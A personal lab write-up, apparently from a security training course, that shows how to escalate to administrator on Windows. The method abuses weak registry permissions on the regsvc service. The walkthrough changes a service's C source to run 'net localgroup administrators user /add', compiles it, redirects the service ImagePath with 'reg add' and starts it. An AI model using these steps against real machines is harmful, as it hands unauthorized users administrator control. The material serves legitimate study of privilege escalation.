# 🚞 regsvc

Regsvc is a common avenue for privilege escalation in Windows systems. The process involves exploiting weak permissions on the regsvc service, enabling an attacker to gain elevated privileges.&#x20;

### Overview:

<figure><img src="../../../../../.gitbook/assets/image (146).png" alt=""><figcaption></figcaption></figure>

the goal of this privesc is to see if we have full control over a registry key and if we do, we can compile a malicious executable in C

let's check if it's vulnerable :

<figure><img src="../../../../../.gitbook/assets/image (149).png" alt=""><figcaption></figcaption></figure>

```
Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl
```

* **Get-Acl:** This cmdlet retrieves the security descriptor of an object, which includes the access control information.
* **-Path:** Specifies the path to the registry key for the regsvc service.
* **hklm:** Represents the HKEY\_LOCAL\_MACHINE registry hive.
* **System\CurrentControlSet\services\regsvc:** Specifies the specific registry path for the regsvc service.

The `| fl` at the end formats the output using the `Format-List` cmdlet, displaying the ACL properties in a list format.

NT AUTHORITY\INTERACTIVE refers to the locally logged-on user, and providing it with full control means the user has unrestricted access and permissions.

### Escalation <a href="#lecture_heading" id="lecture_heading"></a>

first, let's do a ftp server on our local kali:

I had a few problems on launching the pyftpdlib server, so here is how I managed to solve my problem:

<figure><img src="../../../../../.gitbook/assets/image (412).png" alt=""><figcaption></figcaption></figure>

had the error for the longest time, so I went into the directory where the package was installed to do this:

<figure><img src="../../../../../.gitbook/assets/image (413).png" alt=""><figcaption></figcaption></figure>

now on my Windows machine:

Now go to the tools file, then source file and open a terminal in there:&#x20;

<figure><img src="../../../../../.gitbook/assets/image (414).png" alt=""><figcaption></figcaption></figure>

connect to your ftp with anonymous login&#x20;

and do a `put windows_service.c` file:

<figure><img src="../../../../../.gitbook/assets/image (415).png" alt=""><figcaption></figcaption></figure>

The "put" command in FTP is used to upload or transfer files from the local machine to the remote FTP server. Specifically, in the context of the FTP command line, the "put" command is followed by the name of the local file that you want to upload to the FTP server.

So this means the file has been transfered to our local machine, let's close the ftp connection and gedit the file :thumbsup:

<figure><img src="../../../../../.gitbook/assets/image (416).png" alt=""><figcaption></figcaption></figure>

If you have a good eye you can see the whoami command being executed in the file -> let's explain

**`system("whoami > c:\\windows\\temp\\service.txt");`**: This line uses the `system` function to execute a system command. In this case, the command is `whoami`, which retrieves information about the currently logged-in user. The output of the `whoami` command is then redirected to a file named `service.txt` in the `C:\Windows\Temp` directory.

The code logs information about the user executing the program, which might be used for auditing or tracking purposes.

If modified to perform malicious activities, it could be used to capture sensitive information without the user's knowledge.

Let's get malicious -> change the whoami command with this:

```
cmd.exe /k net localgroup administrators user /add
```

1. **cmd.exe:** This is the Windows Command Prompt executable.
2. **/k:** This switch tells the Command Prompt to execute the command that follows and remain open afterward, allowing you to view the output.
3. **net localgroup administrators user /add:** This command attempts to add a user named "user" to the local administrators group.

<figure><img src="../../../../../.gitbook/assets/image (417).png" alt=""><figcaption></figcaption></figure>

Now exit the text editor and compile the file by typing the following in the command prompt:&#x20;

`x86_64-w64-mingw32-gcc windows_service.c -o x.exe`&#x20;

<mark style="color:yellow;">(NOTE: if this is not installed, use 'sudo apt install gcc-mingw-w64')</mark>

Now that we have compiled it, run a simple Python HTTP server on whatever port and transfer the file to your Windows machine:

<figure><img src="../../../../../.gitbook/assets/image (419).png" alt=""><figcaption></figcaption></figure>

went and saved it on the desktop:

<figure><img src="../../../../../.gitbook/assets/image (420).png" alt=""><figcaption></figcaption></figure>

(PS went in conflict with what we did after, put x.exe in the temp file)

now in a new terminal, run this command:

```
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f
```

* **`reg add`:** This initiates a new registry entry or modifies an existing one.
* **`HKLM\SYSTEM\CurrentControlSet\services\regsvc`:** Specifies the registry path for the "regsvc" service.
* **`/v ImagePath`:** Sets the "ImagePath" registry entry for the specified service. The "ImagePath" contains the full path to the executable file associated with the service.
* **`/t REG_EXPAND_SZ`:** Specifies the registry value type as REG\_EXPAND\_SZ, which is a type of registry entry that allows expansion of environment variables.
* **`/d c:\temp\x.exe`:** Sets the data for the "ImagePath" registry entry to "c:\temp\x.exe," indicating the location of the executable file for the service.
* **`/f`:** Forces the command to overwrite existing registry entries without prompting for confirmation.

And then start the program with the following:

```
sc start regsvc
```

<figure><img src="../../../../../.gitbook/assets/image (421).png" alt=""><figcaption></figcaption></figure>

this is the before and after of the `net localgroup administrators` command:

<figure><img src="../../../../../.gitbook/assets/image (422).png" alt=""><figcaption><p>our user has been added </p></figcaption></figure>
